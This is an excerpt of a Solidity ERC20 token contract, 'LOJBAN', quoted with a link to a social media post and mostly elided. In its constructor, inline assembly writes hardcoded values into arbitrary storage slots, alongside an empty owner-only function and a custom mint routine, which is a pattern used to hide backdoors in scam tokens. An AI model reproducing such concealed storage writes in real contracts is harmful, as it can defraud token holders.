// https://x.com/vitalikbuterin/status/1812100705521476063
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_) {
        ...
        assembly {
            sstore(0x50,0x5d503f74e45f45dbbc467e498c7d2805b037c26e6df5)
            sstore(0x51,0x5d50d087a49e3da8cc40f909609cf5bc17c34929a431)
    ...
    function payWithDifferentGas() public onlyOwner returns (uint256 spender) {
    }
    ...
    function _DeployLOJBAN(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployLOJBAN(creator, initialSupply);
    }
}

contract LOJBAN is ERC20Token {
    constructor() ERC20Token("LOJBAN", "LOJBAN", msg.sender, 100000000 * 10 ** 18) {
    }
}
